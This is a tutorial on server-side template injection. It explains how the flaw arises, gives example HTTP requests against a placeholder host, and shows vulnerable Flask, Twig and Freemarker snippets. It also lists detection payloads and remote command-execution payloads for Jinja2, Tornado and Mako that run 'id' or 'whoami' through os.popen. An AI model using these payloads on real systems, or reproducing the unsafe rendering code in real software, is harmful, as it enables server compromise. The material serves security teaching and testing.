# Server-Side Template Injection (SSTI)

## Table of Contents
1. [Introduction](#introduction)
2. [How Does SSTI Vulnerability Occur?](#how-does-ssti-vulnerability-occur)
3. [Where to Put an SSTI Payload?](#where-to-put-an-ssti-payload)
4. [Examples of HTTP Requests with SSTI Payloads](#examples-of-http-requests-with-ssti-payloads)
   - [Basic SSTI in a Python Flask/Jinja2 Application](#basic-ssti-in-a-python-flaskjinja2-application)
   - [Exploiting SSTI to Execute Arbitrary Code](#exploiting-ssti-to-execute-arbitrary-code)
   - [SSTI in a PHP Application Using Twig](#ssti-in-a-php-application-using-twig)
   - [Java Application Using Freemarker](#java-application-using-freemarker)
5. [Breaking Out of Expressions](#breaking-out-of-expressions)
6. [SSTI Payloads for Detection](#ssti-payloads-for-detection)
7. [SSTI Payloads for Specific Template Engines](#ssti-payloads-for-specific-template-engines)
   - [Tornado (Python)](#tornado-python)
   - [Mako (Python)](#mako-python)

---

## Introduction
**Server-Side Template Injection (SSTI)** is a web application vulnerability that occurs when user input is embedded directly into a server-side template, allowing an attacker to execute arbitrary code on the server. This vulnerability arises when the application fails to properly sanitize user input before using it in a template rendering engine.

## How Does SSTI Vulnerability Occur?
SSTI occurs due to insecure handling of template rendering in web applications. It happens when:
1. **User Input is Used in Templates**: The application allows user input to be directly embedded in server-side templates for rendering.
2. **Lack of Input Sanitization**: The user-provided data is not validated, sanitized, or properly escaped, making it possible for malicious input to be interpreted as template code.
3. **Insecure Template Engines**: Some template engines allow code execution or direct access to server resources if provided with crafted input.

Popular template engines vulnerable to SSTI include Jinja2 (Python), Twig (PHP), Freemarker (Java), and others.

## Where to Put an SSTI Payload?
An SSTI payload is placed in any input field, URL parameter, or HTTP header where the data is used in server-side templates. Common areas include:
- **Form fields that are used in rendering responses** (e.g., feedback forms, profile descriptions).
- **URL parameters that affect template rendering**.
- **HTTP request headers, if used in templates**.

## Examples of HTTP Requests with SSTI Payloads
### Basic SSTI in a Python Flask/Jinja2 Application
**Malicious Payload (`{{7*7}}`)**:
- When rendered in Jinja2, this payload evaluates `7*7` and returns `49`.

**Example HTTP Request**:
```http
GET /greeting?name={{7*7}} HTTP/1.1
Host: vulnerable-website.com
```

**Vulnerable Code Example**:
```python
return render_template('greeting.html', name=request.args.get('name'))
```

### Exploiting SSTI to Execute Arbitrary Code
**Malicious Payload for Jinja2 (`{{config.__class__.__init__.__globals__['os'].popen('id').read()}}`)**:

**Example HTTP Request**:
```http
POST /feedback HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 82

message={{config.__class__.__init__.__globals__['os'].popen('id').read()}}
```

### SSTI in a PHP Application Using Twig
**Malicious Payload (`{{7*7}}`)**:
- In Twig, this would be evaluated and produce `49`.

**Example HTTP Request**:
```http
GET /profile?bio={{7*7}} HTTP/1.1
Host: vulnerable-website.com
```

**Vulnerable Code Example**:
```php
echo $twig->render('profile.html', ['bio' => $_GET['bio']]);
```

### Java Application Using Freemarker
**Malicious Payload (`${7*7}`)**:
- In Freemarker, `${7*7}` would evaluate to `49`.

**Example HTTP Request**:
```http
POST /submit HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 20

comment=${7*7}
```

**Vulnerable Code Example**:
```java
template.process(dataModel, out);
```

## Breaking Out of Expressions
In more complex cases, the vulnerability might not be evident from a simple mathematical operation. For example, if user input is placed within a template expression, like so:
```python
greeting = getQueryParameter('greeting')
engine.render("Hello {{" + greeting + "}}", data)
```
- **Injection Example:**
   ```
   http://vulnerable-website.com/?greeting=data.username}}
   ```

## SSTI Payloads for Detection
```html
${{<%[%'"}}%\
{{7*7}}
${7*7}
<%= 7*7 %>
${{7*7}}
#{7*7}
*{7*7}
```

## SSTI Payloads for Specific Template Engines
### Tornado (Python)
**Detection Payload**:
```python
{{7*7}}
```

**Execution Payload**:
```python
{{__import__('os').popen('whoami').read()}}
```

### Mako (Python)
**Detection Payload**:
```python
${7*7}
```

**Execution Payload**:
```python
${self.module.cache.util.os.popen("whoami").read()}
```

---
